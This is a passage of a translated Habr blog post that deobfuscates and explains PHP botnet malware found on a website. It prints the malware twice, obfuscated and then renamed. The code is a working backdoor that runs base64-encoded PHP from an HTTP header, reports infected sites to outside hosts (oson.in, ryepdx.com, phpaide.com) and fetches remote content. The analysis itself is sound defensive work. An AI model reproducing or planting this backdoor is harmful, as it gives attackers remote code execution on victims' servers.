class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>)){ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">determinator_feof</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($II1Ill, &amp;$I111II = NULL)</span></span></span><span class="hljs-function"> </span></span>{ $I111II = microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> feof($II1Ill); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getfile</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($IlI1lI, $Q00OOQ)</span></span></span></span>{ <span class="hljs-string"><span class="hljs-string">"curl"</span></span> = curl; $IllllI = <span class="hljs-string"><span class="hljs-string">"curl"</span></span>.<span class="hljs-string"><span class="hljs-string">"_init"</span></span>; @ini_set(<span class="hljs-string"><span class="hljs-string">"allow_url_fopen"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@ini_get(<span class="hljs-string"><span class="hljs-string">"allow_url_fopen"</span></span>) == <span class="hljs-string"><span class="hljs-string">"1"</span></span>) { $I111I1=@file_get_contents(<span class="hljs-string"><span class="hljs-string">"http://"</span></span> . $IlI1lI . $Q00OOQ. <span class="hljs-string"><span class="hljs-string">"&amp;way=file_get_contents"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $I111I1; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (function_exists($IllllI)){ $QQOQQ0 = @$IllllI(); $Q0000O = <span class="hljs-string"><span class="hljs-string">"curl"</span></span>.<span class="hljs-string"><span class="hljs-string">"_setopt"</span></span>; $I1I1II = <span class="hljs-string"><span class="hljs-string">"curl"</span></span>.<span class="hljs-string"><span class="hljs-string">"_exec"</span></span>; @$Q0000O($QQOQQ0, CURLOPT_URL, <span class="hljs-string"><span class="hljs-string">"http://"</span></span> . $IlI1lI . $Q00OOQ. <span class="hljs-string"><span class="hljs-string">"&amp;way=curl"</span></span>); @$Q0000O($QQOQQ0, CURLOPT_HEADER,<span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); @$Q0000O($QQOQQ0, CURLOPT_RETURNTRANSFER,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); @$Q0000O($QQOQQ0, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number"><span class="hljs-number">5</span></span>); $Il11II = @$I1I1II($QQOQQ0); @curl_close($QQOQQ0); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($Il11II)){ $Il11II = <span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $Il11II; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $II1Ill = @fsockopen($IlI1lI, <span class="hljs-number"><span class="hljs-number">80</span></span>, $QO0Q0O, $QQ0QO0, <span class="hljs-number"><span class="hljs-number">5</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($II1Ill) { $Ill111 = <span class="hljs-string"><span class="hljs-string">""</span></span>; $I111II = <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span>; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"GET {$Q00OOQ}&amp;way=socket HTTP/1.0\r\nHost: {$IlI1lI}\r\n"</span></span>); $QOQ00O = PHP_OS.<span class="hljs-string"><span class="hljs-string">"/"</span></span>.PHP_VERSION; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"User-Agent: {$QOQ00O}\r\n\r\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(!determinator_feof($II1Ill, $I111II) &amp;&amp; (microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) - $I111II) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>){ $Ill111 .= @fgets($II1Ill, <span class="hljs-number"><span class="hljs-number">128</span></span>); } @fclose($II1Ill); $Q0OQOQ = explode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Ill111); <span class="hljs-keyword"><span class="hljs-keyword">unset</span></span>($Q0OQOQ[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> implode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Q0OQOQ); } } } $Il1lll = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>(<span class="hljs-string"><span class="hljs-string">"oson.in"</span></span>, <span class="hljs-string"><span class="hljs-string">"ryepdx.com"</span></span>, <span class="hljs-string"><span class="hljs-string">"phpaide.com"</span></span>); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">write</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($QOO000,$QQ00O0)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($Q00QOO=@fopen($QOO000,<span class="hljs-string"><span class="hljs-string">"w"</span></span>)){ @fwrite($Q00QOO,$QQ00O0); @fclose($Q00QOO); } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">output</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($Q000QQ, $Q0QQ0O)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"Y_"</span></span>.$Q000QQ.<span class="hljs-string"><span class="hljs-string">":"</span></span>.$Q0QQ0O.<span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; } @ini_set(<span class="hljs-string"><span class="hljs-string">"display_errors"</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); define(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); $Q00OO0=<span class="hljs-string"><span class="hljs-string">"ftp13"</span></span>; $I11III=<span class="hljs-string"><span class="hljs-string">"2.19"</span></span>; $QQ00QO=<span class="hljs-string"><span class="hljs-string">"QOO00OQQQQ0"</span></span>; $QQ00OO=<span class="hljs-string"><span class="hljs-string">"base64_decode"</span></span>; $Q0QQOQ=<span class="hljs-string"><span class="hljs-string">"base64_encode"</span></span>; $IlI1lI=<span class="hljs-string"><span class="hljs-string">"http://"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTPS"</span></span>])){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTPS"</span></span>] != <span class="hljs-string"><span class="hljs-string">"off"</span></span>){ $IlI1lI=<span class="hljs-string"><span class="hljs-string">"https://"</span></span>; } } $IlI1lI.=strtolower(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_HOST"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($_GET <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $Q000QQ=&gt;$Q0QQ0O){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($Q0QQ0O,<span class="hljs-string"><span class="hljs-string">"union"</span></span>)){ $_GET[$Q000QQ]=<span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (strpos($Q0QQ0O,<span class="hljs-string"><span class="hljs-string">"select"</span></span>)){ $_GET[$Q000QQ]=<span class="hljs-string"><span class="hljs-string">""</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>])) { $_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>] = @$_SERVER[<span class="hljs-string"><span class="hljs-string">"SCRIPT_NAME"</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"QUERY_STRING"</span></span>]) { $_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>] .= <span class="hljs-string"><span class="hljs-string">"?"</span></span> . @$_SERVER[<span class="hljs-string"><span class="hljs-string">"QUERY_STRING"</span></span>]; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($QOQQO0=$IlI1lI.@$_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>]){ $IlIlll=@md5($IlI1lI.$I11III.PHP_OS.$QQ00QO); $IIIIl1=dirname(<span class="hljs-keyword"><span class="hljs-keyword">__FILE__</span></span>).DIRECTORY_SEPARATOR; $QQQQOQ = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>( <span class="hljs-string"><span class="hljs-string">"/tmp/.font-unix"</span></span>, <span class="hljs-string"><span class="hljs-string">"/tmp/.ICE-unix"</span></span>, @$_SERVER[<span class="hljs-string"><span class="hljs-string">"TMP"</span></span>], @$_SERVER[<span class="hljs-string"><span class="hljs-string">"TEMP"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TMP"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TMPDIR"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TEMP"</span></span>], <span class="hljs-string"><span class="hljs-string">"/tmp"</span></span>, @ini_get(<span class="hljs-string"><span class="hljs-string">"upload_tmp_dir"</span></span>), $IIIIl1.<span class="hljs-string"><span class="hljs-string">"tmp"</span></span>, $IIIIl1.<span class="hljs-string"><span class="hljs-string">"wp-content/uploads"</span></span>, $IIIIl1.<span class="hljs-string"><span class="hljs-string">"wp-content/cache"</span></span>, ); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($QQQQOQ <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $I1I1lI){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($I1I1lI)){ $I1I1lI.=DIRECTORY_SEPARATOR; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_writable($I1I1lI)){ $IIIIl1 = $I1I1lI; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } $tmp=$IIIIl1.<span class="hljs-string"><span class="hljs-string">"."</span></span>.$IlIlll; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_Y_AUTH"</span></span>]==$IlIlll){ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(<span class="hljs-string"><span class="hljs-string">"versio"</span></span>, $I11III.<span class="hljs-string"><span class="hljs-string">"-"</span></span>.$Q00OO0.<span class="hljs-string"><span class="hljs-string">"-php"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($QO0QQQ=$QQ00OO(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_EXECPHP"</span></span>])){ @<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>($QO0QQQ); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(<span class="hljs-string"><span class="hljs-string">"out"</span></span>, <span class="hljs-string"><span class="hljs-string">"ok"</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_file($tmp)){ @touch($tmp); @<span class="hljs-keyword"><span class="hljs-keyword">include_once</span></span>($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ $QOQQO0=@urlencode($QOQQO0); $Q0Q0OQ = @strtolower(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_USER_AGENT"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (explode(<span class="hljs-string"><span class="hljs-string">","</span></span>, <span class="hljs-string"><span class="hljs-string">"google,yahoo,bing,msnbot,ask,baidu,yandex"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $I1l11I){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($Q0Q0OQ, $I1l11I)!==<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@touch($tmp)){ $Q00OOQ = <span class="hljs-string"><span class="hljs-string">"/pg.php?u="</span></span>.$QOQQO0.<span class="hljs-string"><span class="hljs-string">"&amp;k="</span></span>.$IlIlll.<span class="hljs-string"><span class="hljs-string">"&amp;t=php&amp;p="</span></span>.$Q00OO0.<span class="hljs-string"><span class="hljs-string">"&amp;v="</span></span>.$I11III; $I11lII = getfile($Il1lll[<span class="hljs-number"><span class="hljs-number">0</span></span>], $Q00OOQ); @touch($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } } }</code> </pre><br><br>  Now we need to replace variables of the form $ I1l11I with more understandable ones.  In some places this will not work, but nevertheless we will understand what the script does in the end.  Some variables, such as $ Q00OO0, are just strings, so their entries need to be found and replaced with their value.  Here's what happened in the end: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>)) { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">determinator_feof</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($II1Ill, &amp;$microtime = NULL)</span></span></span><span class="hljs-function"> </span></span>{ $microtime = microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> feof($II1Ill); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getfile</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($domain, $strURL)</span></span></span><span class="hljs-function"> </span></span>{ @ini_set(<span class="hljs-string"><span class="hljs-string">"allow_url_fopen"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@ini_get(<span class="hljs-string"><span class="hljs-string">"allow_url_fopen"</span></span>) == <span class="hljs-string"><span class="hljs-string">"1"</span></span>) { $I111I1=@file_get_contents(<span class="hljs-string"><span class="hljs-string">"http://"</span></span> . $domain . $strURL. <span class="hljs-string"><span class="hljs-string">"&amp;way=file_get_contents"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $I111I1; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">"curl_init"</span></span>)){ $objCURL = @curl_init(); @curl_setopt($objCURL, CURLOPT_URL, <span class="hljs-string"><span class="hljs-string">"http://"</span></span> . $domain . $strURL. <span class="hljs-string"><span class="hljs-string">"&amp;way=curl"</span></span>); @curl_setopt($objCURL, CURLOPT_HEADER,<span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); @curl_setopt($objCURL, CURLOPT_RETURNTRANSFER,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); @curl_setopt($objCURL, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number"><span class="hljs-number">5</span></span>); $objCURLResult = @curl_exec($objCURL); @curl_close($objCURL); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($objCURLResult)){ $objCURLResult = <span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $objCURLResult; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $II1Ill = @fsockopen($domain, <span class="hljs-number"><span class="hljs-number">80</span></span>, $QO0Q0O, $QQ0QO0, <span class="hljs-number"><span class="hljs-number">5</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($II1Ill) { $Ill111 = <span class="hljs-string"><span class="hljs-string">""</span></span>; $microtime = <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span>; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"GET {$strURL}&amp;way=socket HTTP/1.0\r\nHost: {$domain}\r\n"</span></span>); $QOQ00O = PHP_OS.<span class="hljs-string"><span class="hljs-string">"/"</span></span>.PHP_VERSION; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"User-Agent: {$QOQ00O}\r\n\r\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(!determinator_feof($II1Ill, $microtime) &amp;&amp; (microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) - $microtime) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>){ $Ill111 .= @fgets($II1Ill, <span class="hljs-number"><span class="hljs-number">128</span></span>); } @fclose($II1Ill); $Q0OQOQ = explode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Ill111); <span class="hljs-keyword"><span class="hljs-keyword">unset</span></span>($Q0OQOQ[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> implode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Q0OQOQ); } } } $arrSites = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>(<span class="hljs-string"><span class="hljs-string">"oson.in"</span></span>, <span class="hljs-string"><span class="hljs-string">"ryepdx.com"</span></span>, <span class="hljs-string"><span class="hljs-string">"phpaide.com"</span></span>); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">write</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($strFile,$strDataToWrite)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($objFileDescriptor=@fopen($strFile,<span class="hljs-string"><span class="hljs-string">"w"</span></span>)){ @fwrite($objFileDescriptor,$strDataToWrite); @fclose($objFileDescriptor); } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">output</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($strGETKey, $strGETValue)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"Y_"</span></span>.$strGETKey.<span class="hljs-string"><span class="hljs-string">":"</span></span>.$strGETValue.<span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; } @ini_set(<span class="hljs-string"><span class="hljs-string">"display_errors"</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); define(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTPS"</span></span>])){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTPS"</span></span>] != <span class="hljs-string"><span class="hljs-string">"off"</span></span>){ $strHost=<span class="hljs-string"><span class="hljs-string">"https://"</span></span>; } } $strHost.=strtolower(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_HOST"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($_GET <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $strGETKey=&gt;$strGETValue){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($strGETValue,<span class="hljs-string"><span class="hljs-string">"union"</span></span>)){ $_GET[$strGETKey]=<span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (strpos($strGETValue,<span class="hljs-string"><span class="hljs-string">"select"</span></span>)){ $_GET[$strGETKey]=<span class="hljs-string"><span class="hljs-string">""</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>])) { $_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>] = @$_SERVER[<span class="hljs-string"><span class="hljs-string">"SCRIPT_NAME"</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"QUERY_STRING"</span></span>]) { $_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>] .= <span class="hljs-string"><span class="hljs-string">"?"</span></span> . @$_SERVER[<span class="hljs-string"><span class="hljs-string">"QUERY_STRING"</span></span>]; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($strFullURL=<span class="hljs-string"><span class="hljs-string">"http://"</span></span>.@$_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>]) { $strExploitedServerID=@md5(<span class="hljs-string"><span class="hljs-string">"http://"</span></span>.<span class="hljs-string"><span class="hljs-string">"2.19"</span></span>.PHP_OS.<span class="hljs-string"><span class="hljs-string">"QOO00OQQQQ0"</span></span>); $strScriptDirectory=dirname(<span class="hljs-keyword"><span class="hljs-keyword">__FILE__</span></span>).DIRECTORY_SEPARATOR; $arrPotentiallyVulnDirectories = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>( <span class="hljs-string"><span class="hljs-string">"/tmp/.font-unix"</span></span>, <span class="hljs-string"><span class="hljs-string">"/tmp/.ICE-unix"</span></span>, @$_SERVER[<span class="hljs-string"><span class="hljs-string">"TMP"</span></span>], @$_SERVER[<span class="hljs-string"><span class="hljs-string">"TEMP"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TMP"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TMPDIR"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TEMP"</span></span>], <span class="hljs-string"><span class="hljs-string">"/tmp"</span></span>, @ini_get(<span class="hljs-string"><span class="hljs-string">"upload_tmp_dir"</span></span>), $strScriptDirectory.<span class="hljs-string"><span class="hljs-string">"tmp"</span></span>, $strScriptDirectory.<span class="hljs-string"><span class="hljs-string">"wp-content/uploads"</span></span>, $strScriptDirectory.<span class="hljs-string"><span class="hljs-string">"wp-content/cache"</span></span>, ); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($arrPotentiallyVulnDirectories <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $strPotentiallyVulnDirectory){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($strPotentiallyVulnDirectory)){ $strPotentiallyVulnDirectory.=DIRECTORY_SEPARATOR; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_writable($strPotentiallyVulnDirectory)){ $strScriptDirectory = $strPotentiallyVulnDirectory; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } $tmp=$strScriptDirectory.<span class="hljs-string"><span class="hljs-string">"."</span></span>.$strExploitedServerID; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_Y_AUTH"</span></span>]==$strExploitedServerID){ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(<span class="hljs-string"><span class="hljs-string">"versio"</span></span>, <span class="hljs-string"><span class="hljs-string">"2.19"</span></span>.<span class="hljs-string"><span class="hljs-string">"-"</span></span>.<span class="hljs-string"><span class="hljs-string">"ftp13"</span></span>.<span class="hljs-string"><span class="hljs-string">"-php"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($strCommand = base64_decode(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_EXECPHP"</span></span>])){ @<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>($strCommand); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(<span class="hljs-string"><span class="hljs-string">"out"</span></span>, <span class="hljs-string"><span class="hljs-string">"ok"</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_file($tmp)){ @touch($tmp); @<span class="hljs-keyword"><span class="hljs-keyword">include_once</span></span>($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ $strFullURL=@urlencode($strFullURL); $strUserAgent = @strtolower(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_USER_AGENT"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (explode(<span class="hljs-string"><span class="hljs-string">","</span></span>, <span class="hljs-string"><span class="hljs-string">"google,yahoo,bing,msnbot,ask,baidu,yandex"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $strSearchEngineAgent){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($strUserAgent, $strSearchEngineAgent)!==<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@touch($tmp)){ $strURL = <span class="hljs-string"><span class="hljs-string">"/pg.php?u="</span></span>.$strFullURL.<span class="hljs-string"><span class="hljs-string">"&amp;k="</span></span>.$strExploitedServerID.<span class="hljs-string"><span class="hljs-string">"&amp;t=php&amp;p="</span></span>.<span class="hljs-string"><span class="hljs-string">"ftp13"</span></span>.<span class="hljs-string"><span class="hljs-string">"&amp;v="</span></span>.<span class="hljs-string"><span class="hljs-string">"2.19"</span></span>; $I11lII = getfile($arrSites[<span class="hljs-number"><span class="hljs-number">0</span></span>], $strURL); @touch($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } } }</code> </pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      So, it became clear to us what this script does: if (! Defined ("determinator")) {- a simple analogue to include_once, since bad people apparently don‚Äôt want their activities to be visible due to error output. <br>  The script uses several utility functions (reading / downloading a file and writing to a file), while getfile first tries to retrieve the contents via file_get_contents, in case of failure through curl and, at the very least, through sockets. <br>  $ ArrSites stores a list of sites from which the script receives data, while the botnet owner is informed about the infected site as soon as a robot from one of the search engines arrives. <br>  If there is already a script for execution, then it is executed without any checks. <br>  <b>As a result, we received a script that can execute the received commands from the botmaster and download files.</b> <br>  PS: after deofuscation, I found the source code of this <a href="https://gist.github.com/ryepdx/5016252">malware</a> - <a href="https://gist.github.com/ryepdx/5016252">gist.github.com/ryepdx/5016252</a> . </div><p>Source: <a href="https://habr.com/ru/post/190682/">https://habr.com/ru/post/190682/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../190668/index.html">Android Intents Library</a></li>
<li><a href="../190672/index.html">Everything I need to know to be a good programmer, I learned in kindergarten</a></li>
<li><a href="../190674/index.html">In the incubator, the story of a startup</a></li>
<li><a href="../190676/index.html">BMW Concept i8 Laser Lights</a></li>
<li><a href="../190680/index.html">Airi - the cloud for the site</a></li>
<li><a href="../190690/index.html">Checklist for overcoming the CAP-theorem</a></li>
<li><a href="../190692/index.html">Microsoft integrates Skype with Outlook.com</a></li>
<li><a href="../190694/index.html">Ways to present dictionaries for automatic text processing</a></li>
<li><a href="../190700/index.html">YAMD: another bike to describe modules in JS</a></li>
<li><a href="../190706/index.html">HTC Desire 600 dual sim - double bet</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

